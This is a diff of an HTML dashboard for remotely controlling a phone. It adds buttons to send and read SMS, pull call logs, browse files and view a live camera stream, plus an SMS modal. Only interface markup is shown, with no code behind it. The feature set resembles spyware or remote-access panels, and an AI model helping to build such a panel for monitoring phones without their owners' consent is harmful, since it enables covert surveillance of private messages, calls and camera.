@@ -115,14 +115,14 @@
                     </div>
 
                     <!-- Remote Control -->
-                    <div class="card shadow-sm">
+                    <div class="card shadow-sm mb-4">
                         <div class="card-body">
                             <h5 class="card-title">Remote Control</h5>
                             <hr>
                             
                             <div class="row g-3">
                                 <!-- Ring Phone -->
-                                <div class="col-md-4">
+                                <div class="col-md-4 col-6">
                                     <button id="btnRingPhone" class="btn btn-danger w-100">
                                         <i class="bi bi-bell-fill"></i>
                                         <span class="d-block mt-2">Ring Phone</span>
@@ -130,7 +130,7 @@
                                 </div>
                                 
                                 <!-- Get Location -->
-                                <div class="col-md-4">
+                                <div class="col-md-4 col-6">
                                     <button id="btnGetLocation" class="btn btn-primary w-100">
                                         <i class="bi bi-geo-alt-fill"></i>
                                         <span class="d-block mt-2">Get Location</span>
@@ -138,10 +138,58 @@
                                 </div>
                                 
                                 <!-- Open URL -->
-                                <div class="col-md-4">
+                                <div class="col-md-4 col-6">
                                     <button id="btnOpenUrl" class="btn btn-success w-100">
                                         <i class="bi bi-link-45deg"></i>
                                         <span class="d-block mt-2">Open URL</span>
+                                    </button>
+                                </div>
+                                
+                                <!-- Send SMS -->
+                                <div class="col-md-4 col-6">
+                                    <button id="btnSendSms" class="btn btn-info w-100">
+                                        <i class="bi bi-chat-dots-fill"></i>
+                                        <span class="d-block mt-2">Send SMS</span>
+                                    </button>
+                                </div>
+                                
+                                <!-- Get Call Logs -->
+                                <div class="col-md-4 col-6">
+                                    <button id="btnGetCallLogs" class="btn btn-warning w-100">
+                                        <i class="bi bi-telephone-fill"></i>
+                                        <span class="d-block mt-2">Call Logs</span>
+                                    </button>
+                                </div>
+                                
+                                <!-- Get SMS -->
+                                <div class="col-md-4 col-6">
+                                    <button id="btnGetSms" class="btn btn-secondary w-100">
+                                        <i class="bi bi-envelope-fill"></i>
+                                        <span class="d-block mt-2">Read SMS</span>
+                                    </button>
+                                </div>
+                                
+                                <!-- Battery Info -->
+                                <div class="col-md-4 col-6">
+                                    <button id="btnBatteryInfo" class="btn btn-dark w-100">
+                                        <i class="bi bi-battery-charging"></i>
+                                        <span class="d-block mt-2">Battery Info</span>
+                                    </button>
+                                </div>
+                                
+                                <!-- Camera Stream -->
+                                <div class="col-md-4 col-6">
+                                    <button id="btnCameraStream" class="btn btn-purple w-100">
+                                        <i class="bi bi-camera-video-fill"></i>
+                                        <span class="d-block mt-2">Camera Stream</span>
+                                    </button>
+                                </div>
+                                
+                                <!-- File Manager -->
+                                <div class="col-md-4 col-6">
+                                    <button id="btnFileManager" class="btn btn-primary w-100">
+                                        <i class="bi bi-folder-fill"></i>
+                                        <span class="d-block mt-2">File Manager</span>
                                     </button>
                                 </div>
                             </div>
@@ -154,6 +202,20 @@
                             
                             <!-- Command Status -->
                             <div id="commandStatus" class="alert alert-info mt-3 d-none" role="alert"></div>
+                        </div>
+                    </div>
+                    
+                    <!-- Live Camera Stream -->
+                    <div id="cameraStreamCard" class="card shadow-sm mb-4 d-none">
+                        <div class="card-body">
+                            <div class="d-flex justify-content-between align-items-center mb-3">
+                                <h5 class="card-title mb-0">Live Camera Stream</h5>
+                                <button id="btnStopStream" class="btn btn-sm btn-danger">Stop Stream</button>
+                            </div>
+                            <div class="text-center">
+                                <img id="cameraStreamImage" src="" class="img-fluid rounded" style="max-width:100%; max-height:480px; background:#000;">
+                                <div id="streamInfo" class="mt-2 text-muted small">Waiting for frames...</div>
+                            </div>
                         </div>
                     </div>
 
@@ -172,6 +234,32 @@
                                 <div class="modal-footer">
                                     <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                                     <button type="button" id="btnSendUrl" class="btn btn-success">Open</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Send SMS Modal -->
+                    <div class="modal fade" id="smsModal" tabindex="-1">
+                        <div class="modal-dialog">
+                            <div class="modal-content">
+                                <div class="modal-header">
+                                    <h5 class="modal-title">Send SMS</h5>
+                                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                                </div>
+                                <div class="modal-body">
+                                    <div class="mb-3">
+                                        <label class="form-label">Phone Number:</label>
+                                        <input type="tel" id="smsPhoneNumber" class="form-control" placeholder="+628123456789">
+                                    </div>
+                                    <div class="mb-3">
+                                        <label class="form-label">Message:</label>
+                                        <textarea id="smsMessage" class="form-control" rows="4" placeholder="Type your message here..."></textarea>
+                                    </div>
+                                </div>
+                                <div class="modal-footer">
+                                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                                    <button type="button" id="btnSendSmsSubmit" class="btn btn-info">Send SMS</button>
                                 </div>
                             </div>
                         </div>
